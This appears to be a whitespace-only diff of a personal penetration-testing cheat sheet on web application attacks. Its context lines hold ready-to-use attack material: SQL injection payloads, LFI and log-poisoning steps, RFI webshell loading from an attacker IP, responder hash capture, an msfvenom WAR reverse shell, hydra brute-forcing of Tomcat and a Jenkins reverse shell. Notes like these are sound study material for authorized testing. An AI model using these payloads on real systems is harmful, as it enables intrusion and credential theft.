@@ -10,13 +10,13 @@ layout: default
 <hr>
 
 <body>
-
+	
 	<h1>Web Application Attacks</h1>
-
+	
 	<hr>
-
+	
 	<h2>Strategy</h2>
-
+	
 	<li>Web directory enumeration</li>
 	<ul>
 		<li>Web Enumeration Tools:</li>
@@ -30,7 +30,7 @@ layout: default
 			<li>/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt</li>
 		</ul>
 	</ul>
-
+	
 	<li>Interesting web pages to check</li>
 	<ul>
 		<li>Check for &lt;url&gt;/index.php/asp/aspx to try to determine which language the server uses.</li>
@@ -46,13 +46,13 @@ layout: default
 			</ul>
 		</ul>
 	</ul>
-
+	
 	<li>Look for exploits</li>
 	<ul>
 		<li>Carefully look at different web app name variations (cutenews & cutephp)</li>
 		<li>Search exploits for website names even if they look "custom" or meaningless</li>
 	</ul>
-
+	
 	<li>Read all web pages</li>
 	<ul>
 		<li>Look for usernames</li>
@@ -62,7 +62,7 @@ layout: default
 			<li>Comments with sensitive information</li>
 		</ul>
 	</ul>
-
+	
 	<li>Burp</li>
 	<ul>
 		<li>Inspect web page requests</li>
@@ -74,7 +74,7 @@ layout: default
 			<li>Interesting headers may be revealed</li>
 		</ul>
 	</ul>
-
+	
 	<li>Nikto</li>
 	<ul>
 		<li>Web server scanner.  Very noisy.</li>
@@ -84,19 +84,19 @@ layout: default
 			<li>CipherString = Default</li>
 		</ul>
 	</ul>
-
+	
 	<li>sql injection</li>
 	<ul>
 		<li>Test *all* input forms</li>
 		<li>&lt;url&gt;.com/id=&lt;Test for sql injection&gt;</li>
 	</ul>
-
+	
 	<li>Input Forms</li>
 	<ul>
 		<li>Test for LFI and RFI</li>
 		<li>Play with input lengths</li>
 	</ul>
-
+	
 	<li>Directory Traversal</li>
 	<ul>
 		<li>Look for links such as: &lt;url&gt;/test.php?page=mkdocs</li>
@@ -118,7 +118,7 @@ layout: default
 			</ul>
 		</ul>
 	</ul>
-
+	
 	<li>Log poisoning</li>
 	<ul>
 		<li>Check for &lt;log&gt;.php/asp/aspx</li>
@@ -126,17 +126,17 @@ layout: default
 			<li>If logs are keeping track of HTTP request user-agents then set user-agent to web shell code and then navigate to the log using LFI</li>
 		</ul>
 	</ul>
-
+	
 	<li>Check github page for web application</li>
 	<ul>
 		<li>Look for issues which may reveal vulnerabilities or exploits</li>
 		<li>Look at file in web app directory, might be able to find something interesting to look for on the victim</li>
 	</ul>
-
+	
 	<hr>
-
+	
 	<h2>Login Page</h2>
-
+	
 	<li>Password attack</li>
 	<ul>
 		<li>Common Credentials</li>
@@ -160,7 +160,7 @@ layout: default
 			<li>If this works, you will login without providing correct password</li>
 		</ul>
 	</ul>
-
+	
 	<li>Enumerate valid users</li>
 	<ul>
 		<li>Observe error message returned when attempting to login</li>
@@ -174,14 +174,14 @@ layout: default
 			</ul>
 		</ul>
 	</ul>
-
+	
 	<li>Sql injection</li>
 	<li>nosql injection</li>
-
+	
 	<hr>
-
+	
 	<h2>SQL Injection</h2>
-
+	
 	<li>Preventing SQL injection</li>
 	<ul>
 		<li>Use parameterized queries, also known as prepared statements.  This puts parameters or placeholders into SQL statements.  The databased binds the values of the user input to the statement.  This prevents user input from manipulating SQL code.</li>
@@ -193,14 +193,14 @@ layout: default
 			<li>Such as:  &ldquo;&lt;&gt;/?*()&amp;,SQL,SCRIPT,SELECT,INSERT,UPDATE,DROP,%0A,%0D,%00</li></li>
 		</ul>
 	</ul>
-
+	
 	<table>
 		<tr>
 			<td>Test for sql injections</td>
 			<td>' or 1=1-- -<br>a' or 1=1-- -<br>' or 1=2-- -<br>a' or 1=2-- -<br>' UNION SELECT sleep(5)-- -</td>
 		</tr>
 	</table>
-
+	
 	<li>Blind SQL Injection:</li>
 	<ul>
 		<li>In a blind SQL injection attack there is no SQL output, but the SQL injection is working behind the scenes</li>
@@ -229,7 +229,7 @@ layout: default
 			</ul>
 		</ul>
 	</ul>
-
+	
 	<li>Examples of login bypass:</li>
 	<table>
 		<tr>
@@ -269,8 +269,8 @@ layout: default
 			</td>
 		</tr>
 	</table>
-
-
+	
+	
 	<h4>SQL Injection Error Attack</h4>
 	<li>Error Injection Method #1 - Current DB</li>
 	<table>
@@ -314,7 +314,7 @@ layout: default
 			<td>1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 <mark>&lt;column 1&gt;</mark>+CHAR(58)+<mark>&lt;column2&gt;</mark> FROM (SELECT top <mark>&lt;increase # starting with 1&gt;</mark> <mark>&lt;column 1&gt;</mark> , <mark>&lt;column 2&gt;</mark> FROM <mark>&lt;table 1&gt;</mark> ORDER BY <mark>&lt;column 1&gt;</mark> ASC) sq ORDER BY <mark>&lt;Column 1&gt;</mark>  DESC)+CHAR(58)+CHAR(58)))--</td>
 		</tr>
 	</table>
-
+	
 	<li>Error Injection Method #1 - Other DB's</li>
 	<table>
 		<tr>
@@ -334,7 +334,7 @@ layout: default
 			<td>1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 <mark>&lt;Column&gt;</mark> FROM (SELECT top <mark>&lt;Increase # starting with 1&gt;</mark> <mark>&lt;Column&gt;</mark> FROM <mark>&lt;Database&gt;</mark>..<mark>&lt;Table&gt;</mark> ORDER BY <mark>&lt;Column&gt;</mark> ASC) sq ORDER BY <mark>&lt;Column&gt;</mark> DESC)+CHAR(58)+CHAR(58)))--</td>
 		</tr>
 	</table>
-
+	
 	<li>Error injection Method #2</li>
 	<table>
 		<tr>
@@ -433,11 +433,11 @@ layout: default
 			</td>
 		</tr>
 	</table>
-
+	
 	<h4>SQL Injection Union Attack</h4>
-
+	
 	<li>Quick union attack method - group_concat</li>
-
+	
 	<table>
 		<tr>
 			<td>Enumerate DB Names</td>
@@ -500,7 +500,7 @@ layout: default
 			</td>
 		</tr>
 	</table>
-
+	
 	<li>Long union attack method</li>
 	
 	<table>
@@ -607,12 +607,12 @@ layout: default
 			</td>
 		</tr>
 	</table>
-
+	
 	<li>Other useful injections</li>
 	<ul>
 		<li>'UNION SELECT 1,<mark>&lt;insert from the below&gt;</mark>,3....-- -</li>
 	</ul>
-
+	
 	<table>
 		<tr>
 			<td>Mysql version</td>
@@ -652,7 +652,7 @@ layout: default
 			</td>
 		</tr>
 	</table>
-
+	
 	<li>MSSQL</li>
 	<ul>
 		<li>xp_cmdshell</li>
@@ -682,7 +682,7 @@ layout: default
 			</tr>
 		</table>
 	</ul>
-
+	
 	<li>sqlmap</li>  
 	<ul>
 		<li>Usage (batch style) with some flags explained:</li>
@@ -720,11 +720,11 @@ layout: default
 			</table>
 		</ul>
 	</ul>
-
+	
 	<hr>
-
+	
 	<h2>LFI</h2>
-
+	
 	<li>Finding LFI</li>
 	<ul>
 		<li>&lt;url&gt;/?page=&lt;Directory&gt;</li>
@@ -740,7 +740,7 @@ layout: default
 			</ul>
 		</ul>
 	</ul>
-
+	
 	<li>Files to test for LFI:</li>
 	<ul>
 		<li>Windows:</li>
@@ -758,7 +758,7 @@ layout: default
 			<li>/etc/passwd</li>
 		</ul>
 	</ul>
-
+	
 	<li>Sometimes a website might look for certain words to be included in the url</li>
 	<table>
 		<tr>
@@ -770,13 +770,13 @@ layout: default
 			<td>http://&lt;url&gt;/department/manage.php?notes=files/UserNotes/../../../../etc/passwd</td>
 		</tr>
 	</table>
-
+	
 	<li>Email poisoning</li>
 	<ul>
 		<li>Send email to user that includes a web shell</li>
 		<li>Access the email through LFI - /var/mail/&lt;username&gt;?cmd=&lt;command&gt;</li>
 	</ul>
-
+	
 	<li>Log file poisoning</li>
 	<ul>
 		<li>Change User-Agent to web shell</li>
@@ -786,11 +786,11 @@ layout: default
 			<li>Possible windows log location - c:\xampp\apache\logs\access.log</li>
 		</ul>
 	</ul>
-
+	
 	<hr>
-
+	
 	<h2>RFI</h2>
-
+	
 	<li>Remote file inclusion</li>
 	<ul>
 		<li>phpinfo - allow_url_include must be set to "On" for RFI to work</li>
@@ -798,15 +798,16 @@ layout: default
 			<li>Old versions had this on by default.  New versions have it off by default.</li>
 		</ul>
 	</ul>
-
+	
 	<li>If RFI is found, get a webshell by accessing shell.php</li>
 	<ul>
 		<li>&lt;victim url&gt;/file=&lt;attacker ip&gt;/shell.php</li>
 	</ul>
-
+	
 	<li>Windows</li>
 	<ul>
 		<li>Identify RFI</li>
+
 		<table>
 			<tr>
 				<td>Test RFI using SMB</td>
@@ -817,22 +818,24 @@ layout: default
 				<td>nc -lvnp 445</td>
 			</tr>
 		</table>
-
+		
 		<li>Try to extract a hash</li>
-		<ul>
-			<table>
-				<tr>
-					<td>Listen for SMB</td>
-					<td>responder -I tun0</td>
-				</tr>
-				<tr>
-					<td>Watch traffic on 445</td>
-					<td>tcpdump -i tun0 port 445</td>
-				</tr>
-			</table>
 
+		<table>
+			<tr>
+				<td>Listen for SMB</td>
+				<td>responder -I tun0</td>
+			</tr>
+			<tr>
+				<td>Watch traffic on 445</td>
+				<td>tcpdump -i tun0 port 445</td>
+			</tr>
+		</table>
+		
+		<ul>
 			<li>If traffic shows on 445 when attempting the RFI but nothing shows in responder then the server is not vulernable to this attack</li>
 		</ul>
+
 		<li>Try setting up SMB Server on attacker and attempt to use RFI to access these files</li>
 		<ul>
 			<li>RFI &lt;url&gt;/&lt;smb share&gt;/shell.php&amp;cmd=whoami</li>
@@ -840,7 +843,7 @@ layout: default
 			<li>Try built in linux SMB Server</li>
 		</ul>
 	</ul>
-
+	
 	<li>Linux</li>
 	<ul>
 		<li>Identify RFI</li>
@@ -855,11 +858,11 @@ layout: default
 			</tr>
 		</table>
 	</ul>
-
+	
 	<hr>
-
+	
 	<h2>PHP Wrappers</h2>
-
+	
 	<li>Examples:</li>
 	<table>
 		<tr>
@@ -884,11 +887,11 @@ layout: default
 			<td>&lt;url&gt;/something=php://filter/resource=&lt;php page&gt;</td>
 		</tr>
 	</table>
-
+	
 	<hr>
-
+	
 	<h2>phpinfo.php</h2>
-
+	
 	<table>
 		<tr>
 			<td>allow_url_include = on</td>
@@ -909,11 +912,11 @@ layout: default
 			<td>Directory of web server files</td>
 		</tr>
 	</table>
-
+	
 	<hr>
-
+	
 	<h2>Upload Restriction Bypass</h2>
-
+	
 	<li>Try uploading with different extensions & file types</li>
 	
 	<li>Try double extensions</li>
@@ -921,12 +924,12 @@ layout: default
 		<li>.php.gif</li>
 		<li>.gif.php</li>
 	</ul>
-
+	
 	<li>Test for extension whitelist vs blacklist</li>
 	<ul>
 		<li>Attempt to upload a random extension (Ex. file.aaaaaaa).  If that extension is not allowed then it is likely a extension whitelist is in place.</li>
 	</ul>
-
+	
 	<li>Magic bytes</li>
 	<ul>
 		<li>Bytes at the beginning of a file that indicate which type of file it is, on the byte level</li>
@@ -949,11 +952,11 @@ layout: default
 			<li>Only works on old versions of php</li>
 		</ul>
 	</ul>
-
+	
 	<hr>
-
+	
 	<h2>Web Servers & OS Combos</h2>
-
+	
 	<li>Apache on Windows</li>
 	<ul>
 		<li>Not the typical Windows web server</li>
@@ -963,29 +966,29 @@ layout: default
 		</ul>
 		<li>Usually using .php</li>
 	</ul>
-
+	
 	<li>IIS on Windows</li>
 	<ul>
 		<li>Typical Windows web server</li>
 		<li>Files placed in C:\inetpub\htdocs</li>
 		<li>Usually using .asp and/or .aspx</li>
 	</ul>
-
+	
 	<li>nginx</li>
 	<ul>
 		<li>Typically not running PHP, but it is possible</li>
 	</ul>
-
+	
 	<hr>
-
+	
 	<h2>Tomcat</h2>
-
+	
 	<li>Provides a way of running java applications (.WAR files)</li>
 	<li>Tomcat proxy that gives localhost access to the machine</li>
 	<ul>
 		<li>AJP / port 8009</li>
 	</ul>
-
+	
 	<li>Deploy .war reverse shell</li>
 	<ul>
 		<li>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.83 LPORT=4444 -f war &gt; shell.war</li>
@@ -995,40 +998,40 @@ layout: default
 			<li>curl -u &apos;&lt;username&gt;:&lt;password&gt;&apos; http://10.129.241.149:8080/manager/text/deploy?path=/shell --upload-file shell.war</li>
 		</ul>
 	</ul>
-
+	
 	<li>Brute force tomcat credentials</li>
 	<ul>
 		<li>hydra -L words.lst -P words.lst http-get://10.0.0.25:8080/host-manager/html</li>
 		<li>hydra -C   /seclists/passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.0.0.25:8080/host-manager/html</li>
 	</ul>
-
+	
 	<li>Helpful Files</li>
 	<ul>
 		<li>tomcat-users.xml</li>
-			<ul>
-				<li>List of user credentials and permissions.  This file can be in multiple locations.  $CATALINA_BASE/conf/tomcat-users.xml is the configuration file, but any of the below locations could be linked to conf/tomcat-users.xml</li>
-				<li>/etc/tomcat9/tomcat-users.xml</li>
-				<li>/opt/tomcat/apache-tomcat-9.0.54/conf/tomcat-users.xml</li>
-				<li>/usr/share/tomcat9/etc/tomcat-users.xml</li>
-				<li>/var/lib/ucf/cache/:etc:tomcat9:tomcat-users.xml</li>
-			</ul>
-
+		<ul>
+			<li>List of user credentials and permissions.  This file can be in multiple locations.  $CATALINA_BASE/conf/tomcat-users.xml is the configuration file, but any of the below locations could be linked to conf/tomcat-users.xml</li>
+			<li>/etc/tomcat9/tomcat-users.xml</li>
+			<li>/opt/tomcat/apache-tomcat-9.0.54/conf/tomcat-users.xml</li>
+			<li>/usr/share/tomcat9/etc/tomcat-users.xml</li>
+			<li>/var/lib/ucf/cache/:etc:tomcat9:tomcat-users.xml</li>
+		</ul>
+		
 		<li>/usr/lib/systemd/system/tomcat9.service</li>
 		<ul>
 			<li>Will show CATALINA_HOME and CATALINA_BASE variables</li>
 		</ul>
-
+		
 		<li>Find other files</li>
 		<ul>
 			<li>Search apache version + Ubuntu to find the ubuntu distribution that is most likely running on the box.  Then google the distribution name + tomcat in order to find the tomcat file directories installed on the box.</li>
 			<li>Install tomcat and search for the location on your own box.  Example: <code>sudo apt install tomcat9</code></li>
 		</ul>
 	</ul>
-
+	
 	<hr>
-
+	
 	<h2>Wordpress</h2>
-
+	
 	<li>Exploitation</li>
 	<ul>
 		<li>Login as admin, edit theme or upload malicious plugin</li>
@@ -1038,7 +1041,7 @@ layout: default
 			<li>Check for writable pages under themes section</li>
 		</ul>
 	</ul>
-
+	
 	<li>Tools</li>
 	<ul>
 		<li>Vane</li>
@@ -1072,7 +1075,7 @@ layout: default
 			</table>
 		</ul>
 	</ul>
-
+	
 	<li>Check for credentials saved in plugins</li>
 	<ul>
 		<li>Example: Easy WP SMTP</li>
@@ -1086,12 +1089,12 @@ layout: default
 			</ul>
 		</ul>
 	</ul>
-
+	
 	<li>WP login page</li>
 	<ul>
 		<li>website.com/wp-login.php</li>
 	</ul>
-
+	
 	<li>Manually Enumerating WordPress</li>
 	<ul>
 		<li>Tools > Site Health > Info > Server & Database</li>
@@ -1101,11 +1104,11 @@ layout: default
 			<li>Database host IP</li>
 		</ul>
 	</ul>
-
+	
 	<hr>
-
+	
 	<h2>Jenkins</h2>
-
+	
 	<li>RCE if authenticated</li>
 	<ul>
 		<li>Go to "Script Console" and execute the below for a reverse shell</li>
@@ -1123,7 +1126,7 @@ layout: default
 				</td>
 			</tr>
 		</table>
-
+		
 		<li>Create new "Freestyle" project</li>
 		<ul>
 			<li>Noisier, people can see new project being created</li>
@@ -1133,22 +1136,22 @@ layout: default
 			</ul>
 		</ul>
 	</ul>
-
+	
 	<hr>
-
+	
 	<h2>Sharepoint</h2>
-
+	
 	<li>Enumeration</li><ul>
 		<li>/usr/share/wordlists/seclists/discovery/web_content/sharepoint.txt</li>
 		<li>&lt;url&gt;/_layouts/viewlsts.aspx</li><ul>
 			<li>Shows different libraries</li>
 		</ul>
 	</ul>
-
+	
 	<hr>
-
+	
 	<h2>Gatsby</h2>
-
+	
 	<li>Development mode</li>
 	<ul>
 		<li>If enabled we can interact directly with the web database</li>
@@ -1156,14 +1159,14 @@ layout: default
 			<li>/_graphql</li>
 		</ul>
 	</ul>
-
+	
 	<hr>
-
+	
 	<h2>Webdav</h2>
-
+	
 	<li>Webdav gives the ability to manage files on a web server.  Actions such as update, delte, move, and copy.</li>
 	<li>RCE - If we have access to webdav then we can get RCE by uploading a web shell.</li>
-
+	
 	<li>Tools</li>
 	<ul>
 		<li>cadaver</li>
@@ -1174,14 +1177,14 @@ layout: default
 			</ul>
 		</ul>
 	</ul>
-
+	
 	<li>Credential file - Webdav can use basic authentication.  If it does we can find the credentials stored on the web server in a file called passwd.dav.  This file is usually in whichever directory that has basic auth enabled.</li>
 	<ul>
 		<li>Example location of this file: /var/www/html/webdav/passwd.dav</li>
 	</ul>
-
+	
 	<hr>
-
+	
 	<h2>SSTI (Server Side Template Injection)</h2>
-
+	
 	<li><a href="command_injection.html#ssti">Click here</a></li>
